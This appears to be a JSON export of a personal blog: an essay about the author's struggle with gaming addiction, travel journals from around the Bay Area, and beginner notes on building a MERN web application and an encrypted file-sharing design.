is at concern.\n\nShitwares are similar to games in nature. The two share many striking similarities.\n\nBoth are very bloated, both require heavy GUI to work.\n\nI don't have one reason to get bloat in the first place, I mean, honestly gaming isn't necessary, so I should uninstall it. Installing bunch of bloat on my computer of phone system is bad in the first place.\n\nYou have completely no control over the game. It is not something you can master or learn, but the company(or autonomy) decides for you. The company can change the game at any moment, can go malicious. Thus, there is absolutely no point in gaming anyways. You are making a fool out of yourself by gaming.\n\nI really hate stupid guis because they are just mostly unnecessary. Why can't one person control stuff from command line? From python library? From npm library? There shall be enough of those for something to be fun!\n\n## Why is gaming similar to BD/dollarM?\n\nGaming is like BD/dollarM, and users acts like \"SUB\", or \"M\", and companies are \"DOM\", or \"S\". The user got tied up and spanked and strangled and chocked, and the company laughs and gets on top of the use, and shits on the user, does whatever they want.\n\nExcept BD/dollarM can be actually enjoyable(like in Fifty Shades of Grey seems enjoyable), but gaming can't.\n\nBD/dollarM has \"consent\" in it, where DOMs don't do everything to subs, instead, they agree on the limits strictly. Say, someone says no to breath-play, so they would agree and not do it. Doing anything more than consent is considered \"Rape\", and strictly illegal, and shall be subject to jailtime.\n\nGaming also has \"consent\" in it, where users would agree to some \"terms and conditions\" in the before clicking into the game. Except users don't look at the terms and conditions, and usually go through them very quickly. As a result, company can write anything in those terms and conditions, and thus they have endless consent(like sell your data lol).\n\nThis is similar to BD/dollarM, where DOMs(usually male) objectify SUBs, and objects can't give consent anyways. So, in the end SUBs(usually female), ends up automatically granting a lot more than suitable. In reality, people neglect those consents, and this makes the SUB very uncomfortable, hurting their lives and causing life-long emotional problems.\n\nGaming to me is the same. I was pushed into consent by those shitty companies(which are malicious and hope to earn my money). When opening a game, it is like going into the BD/dollarM fantasy. It seem very intriguing to go into but as it continues the SUB is endlessly exploited, deprived of human rights, and will have extremely low self-esteem and life positivity.\n\nGaming objectifies the user. Javascript games are better because they don't require installing malicious malwares on my computer. But they are malicious(most of them are) anyways.\n\nWhen you give company endless limits(just no limits), they will try to get as much as they want. User will be chocked, wipped like a slave, kicked and punched, whatever. Users will lose money when company demands it.\n\nI have a lot of emotional distress even now, suffering from gaming from a few years ago. Gaming traumatized my life.\n\n## About Other People\n\nWhether or not other people like gaming is none of my business. People do whatever they want as long as they don't affect me personally. Some people don't feel gaming is taking control over their mind (there are definitely a lot of those people existing), and I admire them for their perseverance because I don't have the endurance to go against gaming long-term. Overall, I have a lack of knowledge about people in the world, so I will just settle here.\n\nAs I found out, normal people are incredibly good at controlling themselves from not being overly addicted to gaming. Not me! I am very emotionally weak and at a severe lack of self-control. I am very prune and easily damaged by those gaming stuff. I am not resilient and persistant at all. I am very very weak and vulnerable mentally and emotionally. I am not very competent in handling such stuff(I don't think I will be in the near future, I have a history of not being able to handle stuff like this well).\n\nIt is extreme troublesome to me when someone suggests gaming in a non-troublesome way because it is something that geniuely traumatized my life for so long and it gave me so much pain all the time.\n\nIt made me incompetent, doesn't mean it make other people incompetent. People, as I known, are usually very smart, much smarter than me in most cases. But being smart doesn't mean being abled. Anyways, point is I will fight against gaming with all I can.\n\n## Evil Nature\n\nThe fact that I cannot quit gaming even though I tried for so many years tells me something about the evil nature of it. Not all games are evil, but at least it contains some very dark instances. Sort of like going into \"Myanmar\" or \"Ukraine\" or \"North Korea\" won't necessarily be life threatening(this is in 2024), but most likely will.\n\nWhat I can learn is that I gained absolutely nothing from gaming. So it is like the result will always be negative, in fact, having a huge chance of being very negative.\n\n## LibreJS\n\nPerhaps a good way to cope with gaming is to install LibreJS. It is more of a extreme way, but certainly plausible and a measure to be taken in extreme consequences. Doing so will stop users from visiting any of the mainstream sites like YouTube, Twitter, Reddit, and be redirected to a libre instance.\n\nI don't use LibreJS now.\n\nHowever, this is a good way of stopping games altogether because gaming most certainly requires nonfree javascript. So in the end users can live happily under the shield of free and healthy javascript and not be forced to consume those drugs and malicious company based javascript.\n\n## Previous: 2022.10.13 The Pros of Playing Computer Games\n\n### NO!!!!!!!!!!!!\n\n## The Cons of Playing Computer Games\n\n### Gain nothing\n\nOut of doing all activities, one gains nothing playing computer games. I\ncan learn about other people's lives, experiences, knowledge about life\nreading books. I can learn about math and computer science watching\nYouTube. Exercising can help build my body and relax. Doing housework\ncan help me feel comfortable. However, computer games have none of these\neffects.\n\nComputer games require little skill to understand and play. They are\nsimple and boring--everybody is alike in the game. You cannot learn\nanything by playing computer games.\n\n### Time consuming\n\nComputer Games result in wasting much of my spare time. What's more, I\nalways play more than I intend to. For example, once I started playing\n\"zombsroyal\", I usually can't stop and keep on playing for four hours.\nComputer Games are simply too addicting, their effects just like drugs.\nOne can easily spend an entire day doing nothing and playing computer\ngames, and not even noticing time passing. I have just so much more time\nto do other things if I quit computer games.\n\nSome people might argue that \"he is just tired,\" or he can't do anything\nmuch in these hours besides playing computer games. This sounds very\nstrange and absurd. When I am playing video games, my brain is still\ndoing work--when I am playing \"generals\" or \"2048\", I am always thinking\nabout the strategies and how to win. A really tired person can't play\nvideo games. Just taking a walk in the park, or reading a literature\nbook, or watching an inspirational video on YouTube, which usually takes\nabout only 1 hour or less, one can easily put the time to use!\n\n### Long Recovery Period\n\nAfter I play computer games, I always feel dizzy and disoriented--I need\nto rest and cannot go straight back to my work. However, when I finished\nwalking, or reading English books, or sleeping, I go back to doing math\nfully refreshed. Playing computer games consumes not only the time one\nspends looking at the screen, but also puts one in a dysfunctional state\nlong after finishing. I cannot go back to studying after playing video\ngames. In fact, usually the whole day is wasted.\n\n### Sleeping trouble\n\nPlaying games brings excitement. Playing games at night may affect one's\nsleep. Sometimes game addicts will stay up to 12:00 pm to play games,\nwhich causes significant distress the next day. Sleeping is really\nimportant to one's well-being, and one's efficiency of learning math and\ncomputer science.\n\n### Harmful to eyes\n\nSince computer games are so addicting, one usually spends so much time\nlooking at the screen without even blinking, which can be very harmful\nto one's eyes. My eyes on August 2022 are 0.8 and 0.6, which aren't very\ngood. I should really take the matters seriously. Other computer\nactivities, like coding or watching YouTube, don't require one to keep\nhis eyes open all the time, leading to a less harmful effect on the\neyes. Doing outdoor activities are very good for the eyes, especially\nafter sitting in the classroom all day long.\n\n### Harmful to Health\n\nWhen I play games, I usually sit rigid for hours. I don't drink water or\ngo to the bathroom, which can have a negative effect on the body.\n\n### Getting Isolated\n\nSince playing games is something I can enjoy alone, I usually isolate\nmyself from society when playing video games. Thus, playing games stop\nme from making friends and communicating with my schoolmates\neffectively.\n\n### Meaningless life\n\nSince games are immersive and addictive, one may easily forget about\nlife altogether after spending much time on games--real life doesn't\nmatter that much, compared to the game. Instead of challenging and\ntrying to go through the difficulties--tests, homework, competition, one\ntends to avoid and find a way of escaping, always into a game. One may\nconsider the game as an exit to all the sorrows and real hardships in\nlife. However, these problems always exist, and simply won't go away.\nThus, one adopts a negative attitude towards life and sneaks himself\naway from it. One will also turn a blind eye to his relatives or\nfriends. Since the game is meaningless, one's life is meaningless as\nwell.\n\n### Inappropriate behavior\n\nAfter playing gun games, one will sometimes try out the actions used in\nthe games. One may constantly think about fighting--committing crimes\nand murdering--instead of studying math and computer science. Sometimes\ngame addicts don't like to sit down in a classroom and study math\nbecause they are too restless. Sometimes game addicts adopt the same\nkind of behavior towards his classmates, which leads to violent\nbehaviors and him being hated by all. Since there are usually those\nstrange sounds in games, one may choose to imitate them after playing\ntoo much. As a result, one may constantly speak profanity (words like\ndamn) and curse others. This is very inappropriate behavior, considered\nuncivilized and uneducated.\n\n### Limited ability\n\nSince games are simple and human reaction speed is limited, computer\nprograms can easily outplay human players. You can just never win a very\ngood computer program in a game. Spending more time studying machine\nlearning and computer science can bring about far more success in video\ngames. Thus, it is meaningless (everything is limited by the game-maker\nand players are manipulated) to play computer games yourself.\n\n### Distracting others\n\nPlaying games usually includes a lot of mouse clicking or exclaiming,\nwhich can really disturb other students around you who are trying to do\nmath. The music in games and the flashing light also make people feel\nrestless. This is really annoying to others who are trying to do\nhomework.\n\n## Why I Should QUIT\n\nIt is obvious from the reasons above that the cons outweigh the pros. At\nthe same time, I obtain much more advantage from doing other activities.\n\n### Another Approach to the Pros\n\n#### Helps forget things\n\nTry sleeping at 8, or 7 pm at night.\n\n#### Instant reward\n\nOne really doesn't need to fill his brain with dopamine all day long.\nBeing excited causes multiple troubles for the brain itself.\n\n#### React Faster\n\nOne really doesn't need to react faster to solve problems. Instead, one\nshould think deeply and thoroughly, and dedicate one's mind to the\nknowledge in order to do that.\n\n## What\\'s next? \n\nI gamed for more than 600 hours in the past year(note: this is in Sep 02 2023), that is the equivalent\nof losing one half month. I can do so much in one half month (without\ntaking into account the fact that when I was gaming I was more tired\nthan usual).\n\nI run out of motivation lately. I couldn\\'t stop myself from gaming\nlately. Every time I tried to stop gaming, gaming dominated my life even\nmore.gaming\n\nWhat should I do next?\n\n**Updates**\\\nI stopped gaming at October 15th 2023, and it\\'s been one month without\ngaming at all. It has been very hard, and I faced mental challenges. I\nhope I can stay away from gaming forever.\n\n**Updates**\\\nSomething happened and I stopped gaming for a total of 93 days, and resumed gaming on January 16th 2024\n\n**Updates**\\\nI am determined to quit gaming and embrace a free life starting Apr 7th 2024 again.\n\n**Updates**\\\nI played video games at 2024.4.28 and 2024.4.29 during emotional breakdown at midnight. I felt so bad.\n\n**Updates**\\\nI played video games at 2024.7.3. I am depressed and in emotional crisis. Gaming traumatized my life but I am in jeopardy with mental burnouts without gaming. Help me!\n\n**Updates**\\\nI played video games at 2024.7.9. This is egregious, man. Get back and going!\n\n\n**Updates**\\\nI played video games at 2024.7.14. It a very very sad time.\n\n\n**Updates**\\\nI played video games at 2024.7.16-8.26. I am so so so depressed. Help me! I am in the worst mental state possible.\n\nI am banning social media now. I am exhausting every last measure I can to regain my autonomy.\n\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb8"}, "title": "Visiting Richmond and North San Francisco", "date": {"$date": "2023-08-31T16:39:00Z"}, "type": "journal", "access": 1, "body": "## 8.27 Visting Richmond\n\nSo this Friday I went to visit Richmond. I went to North Berkeley Bart\nStation, which is not far and downhill from my house, then took the Bart\nto Richmond Station. There is an Amtrack Train at Richmond station. When I\ngot out of the station, the roads looked very rundown. There are\nhomeless people everywhere and the roads are very dirty. There was\nnothing good about the place, and I dreaded that place instantly.\n\nSo I looked at the map and went south to Marina Park, which is north of the\nbay. It was a long walk, there were no people on the streets, and the\nstreet was very dirty. But after walking past a highway everything began\nto feel cleaner. Then I walked into the Marina Park.\n\nThere are many geese in the park, and many boats in the harbor. There\nare hundreds of geese, and their poops are everywhere on the road. I\nwonder how it feels to live in the toilet?\n\nWalking past the large group of geese I could see the bay area, and the\nthe view is quite good, and the Bay trail is clean and not dirty like the\nroads outside.\n\nI could see Albany from the trails, and the small hills with a few\nhouses. I could also see the Golden Gate Bridge. The view was pretty\ngood in the sun.\n\n![](https://cdn.jimchen.me/5baf4990-3b06-4fd4-a97c-f911e3a40897)\n![](https://cdn.jimchen.me/5934271c-0228-4f6b-816c-e41bcb19f5db)\n\nThen I continued walking for a while and went on a Lyft home. I felt\nkind of dizzy later that day for no reason.\n\nThis is a short post so I think that\\'s it. In conclusion, Richmond is a\ndirty and ugly place, but the bay trails are definitely worth visiting.\nI then realized that there are no parks around here, which is kind of\nsad, so the best place for hiking may be Bay Trails, which I went\nmultiple times this year.\n\n## 8.31 Visting San Francisco\n\n### Why?\n\nSo today I was kind of restless and found myself not doing anything at\nall, so I went to visit North San Francisco. I went on the Bart and then\ngot off at Embarcadero.\n\n### Shoreline\n\nSo I walked to the shoreline. There are many tall buildings in San\nFrancisco is much more crowded than Berkeley. The buildings reminded me of the skyscrapers beside Huangpu River, but of course, Huangpu River is\nmuch smaller than the Bay,\n\nThe roads are like really wide, and many people are selling different\nfood, smelling good in the air. Mostly I saw sausages and fruits, but I\nsuppose they kind of lacked hygiene. I could see across the Bay to\nTreasure Island, and Golden Gate Bridge.\n\nThe streets are dirty, and there are many homeless people lying all\naround. There are many cruises and many large boats parked along the\nshoreline which I suppose is for a tour for the people.\n\nIt kind of reminded me of Anchorage, but Anchorage is much cleaner \nmuch less crowded, and less windy. I already wanted to visit Alaska\nagain, but it takes a lot of money.\n\nThen I walked along for a while, and on my left was a small hill. I kept\nwalking and there was an entertainment park, filled with many small\nrestaurants alongside.\n\nThen the wind grew strong and almost unbearable, and I didn\\'t want to\nwalk anymore, so I tried going to Powell Street since there is a Bart\nstation there, and also I wanted to go to Adidas to buy pants.\n\n### Chinatown\n\nWalking from the shoreline the streets became very dirty and very small.\nThere are tall buildings alongside and it was very hilly. I walked\naround and kind of lost direction on Columbus Avenue, going one way and then going the other way. I walked into Chinatown, and it was very dirty.\nThere is a group of like 30 elders sitting around and playing \npoker or something, which reminds me of those senior people back in China,\nand they look kind of alike. I wonder how they felt living here, in this\ncrowded city. Some people told me seniors wanted to go back to their\nhometown, like \\\"falling leaves returning to the root\\\", and I thought\nthat they might be lonely and nostalgic or something, but anyway, I\ndidn't bother to think more.\n\nThen I thought I probably would want to live in a less crowded place and\nquieter place when I got like 70 years old, but that\\'s not my business\nnow anyways.\n\nThere are a bunch of Chinese restaurants in Chinatown, but most are\nclosed. Then there are some other services. But there are also many\nhomeless people who look Asian.\n\n### Market Street\n\nThen I walked to Market Street. It was only my third time in San\nFrancisco (last time I was watching Mean Girls musical, and the time\nbefore my parents\\' car broke down in Ocean Beach), and it felt quite\nqueer since I have already been here like forever. Anyway I went to\nlook for a clothing store.\n\nMarket Street is full of smells of smoke and drugs, I think. Anyways,\nthere are a bunch of homeless people there, but the shopping mall was\ngood.\n\nThen I went on the Bart at Powell Street and went home.\n\n### Conclusion\n\nSan Francisco is crowded and a little dirty compared to Berkeley. It is\nalso very hilly. Shanghai is much better since it is cleaner and there\nwasn\\'t homeless people. But visiting seems interesting. San Francisco\nwouldn't be my top choice for living, though."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb9"}, "title": "How to Block a Website", "date": {"$date": "2023-08-30T17:58:00Z"}, "type": "linux", "access": 1, "body": "## Browser Extension\n\nThere is blocksite chrome extension which helps you block websites.

User can almost never control\nthe root\\'s behavior(even root cannot set rules for root). The only\nexception is like you start a systemd service to shutdown when the\ncomputer starts, which can still be recovered by booting into a recovery\nmode or use a live CD/USB, mount your system\\'s root partition, and then\nremove or disable the problematic service.\n\nI previously thought like you can start 2 programs in the background\nlike one ensuring the other is run, so you can never shut these down.\nHowever, the root can just kill both of them.\n\nSo at the end of the day just embrace the variety of Internet and accept\nthe harmful instances.

Also, I heard that Fremont is really rich, so I\nwanted to there and see for myself.\n\n## How did I go there?\n\nI walked to North Berkeley Bart station (where I usually run to that\nstation at night), then took the Bart for like 30 minutes.\n\n## Fremont Central Park\n\nThere is a beautiful park in the center, and a lake in the middle called\nLake Elizabeth. The park is lovely, and many people are like walking\naround the park. I realize there are no good parks around Berkeley,\nexcept for maybe Strawberry Creek Park, which is like smaller than the\nforest area in the university. I went in and got a map of the park.\nOccasionally there are people speaking Chinese, but also some looking\nlike hispanic. There are no homeless people in the park. There is a\nseries of hills across the park, and those are all yellow, which is kind\nof ugly.\n\nThere are so called many activities in the central park, but I am not\ninterested in any of them.\n\n## Mission Valley\n\nAfter going out of the park there were no people on the roads, like no\none at all, but there were many cars. I was wearing long sleeves and\nlong pants, and it became so hot in the late afternoon. I walked around\nMission Valley, so called \\\"rich neighbourhood\\\". Basically it is quiet\nand you do not see a lot of people on the streets (so food and restroom\nare hard to find). I figured since most people go out driving it won\\'t\nbe a problem.\n\nHowever, there are many cars on the roads, like Paseo Padre Road. It is\nhard to cross the roads because there is almost no pedestrians at all,\nand I had to press the button to actually cross.\n\nThere are many tall trees in the middle of the road, and overall it is\nnicer than Berkeley, but not all that good. I mean, you can see such\nneighbourhoods almost everywhere.\n\n## Walking Long Distances\n\nI walked around the neighbourhood, then went to Mission Community Park.\nIt is overall not hilly compared to Berkeley, but traveling is extremely\nhard without a car, and in the end I walked many miles back to the Bart\nStation, and there is a long distance between different Bart stations.\n\nI carried 1.5 L water and drank all the water, since there are no\ngrocery stores to refill.\n\n## Dinner\n\nThere are, however, many restaurants out of the Bart Station, and I\nmanaged to find a very cheap and nice restaurant, and dinner cost me\naround 15 dollars, which is like the same price as Berkeley.\n\nOn going back to the Bart I felt a little cold, since it was getting\ndark. I was sore and tired from walking, and there wasn\\'t much to do\nand see anyways.\n\n## Conclusion\n\nOverall Fremont is better than Berkeley, since it is cleaner and there\nare no homeless people. However, getting around is definitely harder.\nThe scenery is medium, and those yellow hills are really ugly behind the\npark. Overall it should be like 8 or 9 out of 10."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8debc"}, "title": "End to End Secure File Sharing System", "date": {"$date": "2023-07-22T22:04:00Z"}, "type": "web-dev", "access": 1, "body": "## InitUser\n\n-   Secure the userdata\\\n    Enc keys are deterministic(Argon2, username and password), Sign with\n    private key and store public sign key in keystore\n-   Store it in datastore\\\n    UUID is deterministc (Argon2, username and password)\\\\\n\n## GetUser\n\n-   Derive UUID, Enc keys, check signature then decrypt\\\\\n-   Check if input password matches\\\n    Since encryption protects the confidentiality, the attacker doesn\\'t\n    know the privatesignkey.

As a minimalist, I am not a big fan of designing anyways.\n\n## Jquery\n\nHtml and CSS for javascript is kind of like EasyX in C Language or\nTkinter in Python, which you can use to create better applications.\n\nJavascript makes the webpage alive. For example, you can change classes\nwith Javascript with\n\n```js\ndocument.getElementsById(\"<someid>\").innerHTML=\"<somehtml>\"\n```\n\nOr add a function after button clicking by specifying `<button onclick=\"somefunction()\"/>`\n\nAlso you can add event listener(clicking or keyboard or hand movement),\nalerts, set interval for functions, for example like [this\npage](https://mygame4214.github.io/2048/2048.html)\n\nYou can also add forms and input, and dynamically change the input. Also\nJavascript can modify cookies, and adjust site settings according to the\ncookies.\n\n## React\n\nReact is Javascript Library.\n\nBy using the components, and you can define a kind of component and use\nit again and again, like customized Button\n\nStart React by typing `npx create-my-app <appname>`\n\nthen naviagate to index.js and change it.\n\nBy running npm start, you can see the website on localhost:3000\n\nAlso, I didn\\'t use the app.js file, and I deleted all the logos and not\nuseful stuffs.\n\n### Routing\n\nFirst code the elements you want on a separate js file, and they should\nreturn HTML files. For example, , then render it on a path. (Maybe you\nwant to render about-me on \\\"/aboutme\\\")\n\n```js\nroot.render(\n  <HashRouter>\n    <NavBar />\n    <Routes>\n      <Route path=\"<somepath1>\" element={<someelement> />} />\n      {path}\n    </Routes>\n    <Footer />\n  </HashRouter>\n)\n```\n\nUse BrowseRouter or HashRouter (not much difference between the two for\nme except HashRouter has /#/ on the URL), to construct all path of the\nwebsite. For example, if there is 3 subpages on a website(aboutme,\ncontact, blog), then code like:\n\n```js\n<Route path=\"/aboutme\" element={<AboutMe />} />\n<Route path=\"/contact\" element={<Contact />} />\n<Route path=\"/blog/\" element={<Blog />} />\n```\n\n### Dynamic Routing\n\nYou can also build pages (like a blog), where the page may change and be\nadded, build it like\n\n```js\n// For Loop\narr[i] = (\n          <Route\n            path={date[i]}\n            element={BlogUtil(title[i], text[i], date[i])}\n          />)\n```\n\nThen basically add the array with {} in the middle of routes\n\n## Components and Props\n\nBuild a personal component by adding props in the function, for example,\nbuilding a button function\n\n```js\nconst Button = (props) => {\n  return (\n    <div>\n      <p>{props.title}</p>\n      <button>{props.text}</button>\n    </div>\n  );\n};\n```\n\nthen export then Button. This reduce many lines of duplicate code. You\ncan then add the personalized button with title and text\n`<Button text=\"\" title=\"\" />`\n\n## UI\n\nOf course coding everything is too much, and there are lots of UI\nlibraries, like React-Bootstrap. Install the library from npm, then you\ncan use the components by changing it a little bit.\n\nFor example, a navbar in React-Bootstrap\n\n```js\n<Navbar className=\"bg-body-tertiary\">\n  <Container>\n    <Navbar.Brand href=\"#home\">React-Bootstrap</Navbar.Brand>\n    <Navbar.Toggle aria-controls=\"basic-navbar-nav\" />\n    <Navbar.Collapse id=\"basic-navbar-nav\">\n      <Nav className=\"me-auto\">\n        <Nav.Link href=\"#home\">Home</Nav.Link>\n        <Nav.Link href=\"#link\">Link</Nav.Link>\n      </Nav>\n    </Navbar.Collapse>\n  </Container>\n</Navbar>\n```\n\nThen return the navbar and export to index js. There are also many other\ncomponents in React-Bootstrap like Button or Breadcrumbs. The main\nreason I use the libraries are I don\\'t want to code css.\n\n## Axios\n\nUse axios to communicate with the backend.\n\nFor example\n\n```js\nvar x\naxios.get(\"https://ipapi.co/json\").then(res=>{x=res.data})\n```\n\nThis is a sample code of get request. Also, since the request is JSON,\nit is useful to JSON.stringify the request, or refer to it by index. I\nam only interested in getting the data from the server. There may be\nlots of error in the get request, so it is best to add\n`.catch(error=>{console.log(error)}`\n\nA Post request looks like\n\n```js\naxios.post(\"https://localhost:5000\", {\n    item1: value1\n    item2: value2\n//more items\n});\n```\n\nThis is used to make a post request, which will later put data into\ndatabase.\n\nSo after launching the backend you can use the axios to communicate with\nthe other port on localhost.\n\nAs you can see, it is much easier with the constructed tags than to\nbuild one on my own, and also you can change by specifying style css,\nthen exporting it.\n\nBasically create a header, a footer, render the pages with header and\nfooter separately(so you can see it on every page), then on every page\neither it is static html, or you can perform get requests on other\nwebsites(backend localhost) and add it on the page.\n\n## Mongodb\n\nWhy need the backend? Because like in a social media page there is\nconstantly changing data. I personlly don\\'t think you need a backend\nfor a personal homepage, but anyways, I just want to see how it works.\n\nI used Mongodb in the application, and by signing up on mongodb and\nclicking connect, and it will create default database\n\n```js\nconst uri = \"mongodb+srv://<username>:<password>@cluster0.h0cn5vv.mongodb.net/?retryWrites=true&w=majority\";\n```\n\nadd a uri in the code and connect it by replacing the username and\npassword.\n\n### Mongoose\n\nMongoose is the javascript library to interact with Mongodb server from\nthe code.\n\n### Schema\n\nThe first thing is to define schemas. For example\n\n```js\nconst someSchema = new Schema(\n  {\n    username: {\n      type: String,\n      default: \"\",\n    }\n    password: {\n      type: String,\n      default: \"\",\n    }\n\n  }\n);\n```\n\ndefines a user, then make a mongoose Model, and then you can export the\nfile to the main node file.\n\n## Express\n\nUse express to interact between visiting the webpage and the database.\n\n```js\nrouter.route(\"/post\").post((req, res) => {}\n```\n\ndefines a post method, then we create a new schema and add to the server\n\nIn Get requests we can use find() or sort() methods\n\nYou can store the data as JSON and send to the database, and also view\nand change the database by logging in mongodb and browse collections.\n\nUse axios to interact with the backend and mongoose to connect the\nbackend with the database, and then the site is live.\n\n### Postman APIs\n\nDownload a post API to test the code to debug. By sending a get request\nor post request to the url, then checking the database.\n\n## Site is live\n\nAfter adding cors to the code you can easily create a web application\nwith frontend and backend on different ports in the localhost.\n\nAt this point you should be able to access the website on the network by\ntyping in the computer ip address and the ports.\n\nFor example, if it is hosted on localhost:3000, then go to :3000 to see\nthe website\n\n## Deploy to Linux\n\nHowever, you can\\'t run everything on your own computer because it\ndepends on Internet connection and your computer may shut off, so by\nbuying a Linux on the cloud and runnning the server on the cloud server,\nyou can then deploy the web application.\n\nThis seems easy, but it is the most time-consuming thing of all, and\ntook me many hours in sleepless nights to finish.\n\nBuy a server in Linode(or AWS or whatever), then ssh into the server\nwith shell, then install the node and npm, then git clone the\nrepository, then run it.\n\nThere are several problems:\n\n1 The sudo default installed node is v12, which is really old, and some\napplications require more than v12\n\n2 There may be bugs in the environment, and debugging is hard with\ncommand line\n\nBasically, I just couldn\\'t run the nodejs in the cloud server, and as a\nnoob I want to have a GUI in the cloud server, which makes it look\nbetter than the command line.\n\nBut GUI is very hard to install, and although in my own computer I\ninstalled lightdm and ubuntu-desktop easily. When I tried to install\nxfce, there are some driver problems.\n\nThen I tried tigervnc-standalone-server, and tried connecting using\nRemmina and VNC viewer, and it always refuse to connect. But when\nconnecting with\n`ssh -L 5901:127.0.0.1:5901 user@example.com`\n\nit works.\n\nThen I finally managed to add a vnc hostname and connect to the server\nwith VNC viewer by adding another Linode, and then there was no browser.\n\nThen I installed firefox with snap but keyboard doesn\\'t work in firefox\n(I don\\'t know why), then I tried to install google-chrome but it\nwouldn\\'t open(because I need to change the xhost display settings with\nroot and then open it as user), then I installed Palemoon and it worked\nfine. I tried to install node v18 and it failed, and then I installed\nnode v20 and it succeeded.\n\nThen I deployed the code to [the server](http://45.79.98.144:3000), but\nit wouldn\\'t connect when I used the chrome vpn extension to connect to\nChina(firewall), although it works fine when connecting to other\ncountries like Russia and Netherlands.\n\n## Conclusion\n\nThere are many things to learn in Web Application, but most of them are\nvery simple. I spend many days debugging because of lack of experience\nand hope to code better in the future.\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8debe"}, "title": "My New Website", "date": {"$date": "2023-06-21T23:51:00Z"}, "type": "web-dev", "access": 1, "body": "Hello, I am Jim Chen.

I like Markdown.\n\n## Long Bio\n\nI like computer science, especially playing with cloud. You can see [my server set up here](https://github.com/jimchen2/cloud-setup).\n\nI primarily use AWS because it's large and comprehensive, also, AWS Bedrock has lots of LLMs.\n\nI like S3, and I use Cloudfront for CDN with a [markdown editor](https://markdown.jimchen.me) for this blog.\n\nI also like Git. I use Github to store pretty much anything that doesn't need to be frequently updated now. I also have [a small personal git server](https://git.jimchen.me).\n\nI like Google because I don't care too much about privacy and there are free tiers and out of box offerings.\n\nI don't have social media, nor go on social media unnecessarily. Actually, I would hoard social media every half a year to sustain myself with contents, and rely on RAGs other than that.\n\nI like RSS feeds because I can subscribe to only the ones I wanted.\n\nI am active on Fediverse. I have servers set up for [Mastodon](https://mastodon.jimchen.me), [Peertube](https://peertube.jimchen.me), and [Matrix-Dendrite](https://matrix.jimchen.me).\n\nI hope I don't play any more video games. Instead, I play on HuggingFace more.\n\nW!ndow$ and I have a complicated relationship - mostly, it confuses me, and I  try to avoid it. I use Fedora now.\n\nI like Javascript and PWA for everything because I am very lazy. \n\nI try to work hard.\n\n\n## Today is 2023.6.22\n\nI am testing out the functions and trying to deploy the backend.\n\nToday I am creating the web which I have been doing for like 2 weeks. I\nam a slow learner but I was very curious about web application.\nFortunately, I am building one right now.\n\nI am still trying to deploy the app.\n\n## This is the second paragraph\n\nSee the full writeup here\n\nhttps://jimchen.me/?title=MERN%20Stack%20Conclusion\nhttps://jimchen.me/?title=(deprecated)Website%20Design%20Doc%20Writeup\n\n## Did a few updates\n\n1. Removed the centralized `nginx.conf`, and added sites below available sites for better organization\n2. Created Automatic script to build the website on Linode\n3. Created Automatic script to update the website on Linode\n4. Removed the `id` requirement in the `md_to_dump.py` file, and stopped pushing bloated blogs dir to github\n5. Signed Up for UptimeRobot to monitor my uptime\n\n## Some more things to note\n\n1.  `certbot` doesn't automatic renew\n2. Don't use certbot with a plugin, just use certbot directly\n3. As much as I love ArchLinux, most of the packages are community maintained and on a rolling release, meaning I have to maintain the setup script actively(or else it won't work, but most likely it won't have any problems). Someone from Reddit said he run pacman -Syu every week and didn't have a problem for 2 years. But that doesn't mean ArchLinux's rolling packages is the only cause of problems, namingly npm packages might also cause problems\n4. Misconfiguration of nginx can cause react website to render incorrectly(it still works but the react frontend buttons changed into clickboxes and got bundled together, kinda weird)\n5. Explicitly rewrite the `api` route in nginx `rewrite ^/api/(.\\*) /$1 break;\n6. Don't request too many certs from certbot, there is a limit and my website got down for 2 days because of requesting too many certs\n\n## Updates in 2024.06\n\nI redesigned website with NextJS.\n\nhttps://jimchen.me/?title=Redesigning%20Website%20with%20Nextjs\n\nI also switched to AWS\n\nhttps://jimchen.me/?title=Migrating%20and%20Living%20on%20AWS\n\n\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8debf"}, "title": "Berkeley in My Eyes", "date": {"$date": "2023-06-01T15:38:00Z"}, "type": "journal", "access": 1, "body": "## Downtown\n\nDowntown Berkeley is really ugly and there are many homeless people.\nThey yell, beg for money, shout profanity, and sometimes run around\nnude. I could smell the scent when walking past them, like they hadn\\'t\nshowered for months. Around Shattuck Avenue there are many homeless\npeople, and sometimes they form groups. There are also many construction\nsites that lasts for years, and block the road, so it is really hard to\ngo through. The roads are dense, so I have to wait for traffic light\nafter walking like 50 feet.\n\nDowntown Berkeley at night is not the most pleasant place to walk\naround, as the roads are pretty much empty except for those homeless\npeople walking around.\n\n## Nighttime\n\nAt about 9-10 pm most stores are closed. From 10-12 am, many homeless\npeople are walking around in Shattuck Street, and there are still some\ncars around. I think those homeless people are looking for places to\nsleep. There are still some small groups of students here and there.\nAfter 12, like in 1 am or 2 am in the mornings, all stores are gradually\nclosed. except for some fast food restaurants that sell hamburgers in\nsouth of campus at Durant Street. Then after 2 am, there are almost\nnobody on the streets, and most homeless people find a place to settle.\nIn 2-4 am in the morning, if you walk by some parks or grasses or\nbenches you may spot some people lying and sleeping there, which is kind\nof scary to be honest. There are little cars driving by. The small roads\nare almost pitch dark. The big roads are dimly lighted. Some stores and\nbakeries still have light on but there was definitely no one inside. If\nyou want food at this time of the day, the only stores open is a seven\neleven on College Avenue south of Berkeley, which is like 1.5 miles from\nthe school. When I walked there in 3 or 4 am it is locked to stop\nhomeless people from entering, and you have to knock, and a person will\ncome to the door. The roads was so quiet and calm. After 4 am sometimes\nI could see one or two people walking their pets, and then the birds\nwould start chirping marking the start of another day. When you walk by\nTrader Joe\\'s there was light and you could see some workers shuffling\nthe shelves, although it won\\'t open for another 2 or 3 hours. Then\nafter 5 am it gradually become light, and the eastside hills was covered\nwith morning fog. In the school there was some construction going on and\nthere was trucks driving by really fast. From 6-8 am the street was\nstill very quiet, and most stores still closed, with some people jogging\nin the early morning sun and the fog disappearing.\n\n## North Berkeley\n\nCompared with Downtown, the north side is much better. There are no\nhomeless people, and the houses are better constructed.\n\nBut it is very hilly, and tiresome to walk around carrying a laptop.\nWhen I carry backpack to school, it gets so hot and I would be sweaty.\nThe east side is much higher than the west side in elevation.\n\n## West Berkeley\n\nThe west side are mainly many small roads leading to the Bay, and it is\nbetter than downtown and not hilly. I would usually go running there at\nevenings. It is smooth and quick to run down University Avenue, since it\nis a slight downhill, and 